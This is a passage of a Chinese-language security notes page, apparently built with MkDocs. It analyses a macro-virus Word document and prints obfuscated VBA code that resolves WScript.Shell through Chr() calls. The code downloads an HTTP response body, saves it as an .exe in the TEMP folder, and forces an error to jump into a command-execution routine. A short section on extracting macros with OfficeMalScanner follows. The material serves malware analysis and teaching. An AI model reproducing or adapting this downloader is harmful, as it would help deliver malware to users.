+Set vu2Wh85645xcP0 = lLJrFk6pKsSYJ(Chr(87) &amp; &quot;&lt;&quot; &amp; Chr(83) &amp; &quot;c&quot; &amp; Chr(61) &amp; Chr(114) &amp; &quot;i&quot; &amp; Chr(112) &amp; &quot;t&quot; &amp; Chr(59) &amp; Chr(46) &amp; Chr(83) &amp; &quot;=&quot; &amp; Chr(104) &amp; &quot;e&quot; &amp; &quot;&lt;&quot; &amp; &quot;l&quot; &amp; Chr(108))
+
+'  WScript.Shell &quot;Environment&quot; Process
+Set GhbwRqU9OkbF = CallByName(vu2Wh85645xcP0, Chr(69) &amp; Chr(110) &amp; &quot;v&quot; &amp; Chr(105) &amp; Chr(114) &amp; Chr(111) &amp; &quot;n&quot; &amp; &quot;m&quot; &amp; Chr(101) &amp; Chr(110) &amp; Chr(116), VbGet, Chr(80) &amp; &quot;r&quot; &amp; &quot;o&quot; &amp; Chr(99) &amp; &quot;e&quot; &amp; Chr(115) &amp; &quot;s&quot;)
+
+' &quot;C:\Users\USER\AppData\Local\Temp&quot;
+SD3q5HdXxoiA = GhbwRqU9OkbF(Chr(84) &amp; Chr(69) &amp; Chr(77) &amp; Chr(80))
+
+' &quot;C:\Users\USER\AppData\Local\Temp\fghgkbb.exe&quot;
+aDPbd2byZb = SD3q5HdXxoiA &amp; &quot;\&quot; &amp; Chr(102) &amp; Chr(103) &amp; Chr(104) &amp; Chr(103) &amp; Chr(107) &amp; Chr(98) &amp; Chr(98) &amp; Chr(46) &amp; &quot;e&quot; &amp; &quot;x&quot; &amp; Chr(101)
+
+Dim bvGEpxCVsZ() As Byte
+
+' http  send
+CallByName LhZitls7wPn, Chr(83) &amp; Chr(101) &amp; Chr(110) &amp; Chr(100), VbMethod
+' &quot;responseBody&quot;
+bvGEpxCVsZ = CallByName(LhZitls7wPn, &quot;r&quot; &amp; &quot;e&quot; &amp; Chr(115) &amp; Chr(112) &amp; Chr(111) &amp; Chr(110) &amp; Chr(115) &amp; Chr(101) &amp; Chr(66) &amp; Chr(111) &amp; Chr(100) &amp; &quot;y&quot;, VbGet)
+' 保存文件
+FlvXHsDrWT3aY bvGEpxCVsZ, aDPbd2byZb
+On Error GoTo OhXhZLRKh
+    a = 84 / 0
+  On Error GoTo 0
+
+' 退出函数
+xrIvr6mOXvFG:
+  Exit Sub
+' 进入
+OhXhZLRKh:
+  ' 执行命令函数
+  ENMD3t8EY4A (&quot;UfBPGay4VPJi&quot;)
+Resume xrIvr6mOXvFG
+End Sub
+</code></pre>
+
+<h4 id="3_3">(3) 工具提取宏</h4>
+<p>使用 OfficeMalScanner,可以将宏导出来以便分析。</p>
+<ul>
+<li>1、解压文档文件</li>
+</ul>
+<p>OfficeMalScanner.exe  宏病毒文档.docm inflate</p>
+<ul>
+<li>2、提取宏代码</li>
+</ul>
+<p>OfficeMalScanner.exe vbaProject.bin info</p>
+                
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../04_Java_Book/" title="Java" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Java
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../Other-Powersehll/" title="Powersehll" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Powersehll
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.5e60981f.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+    
+      
+    
+  </body>
+</html>
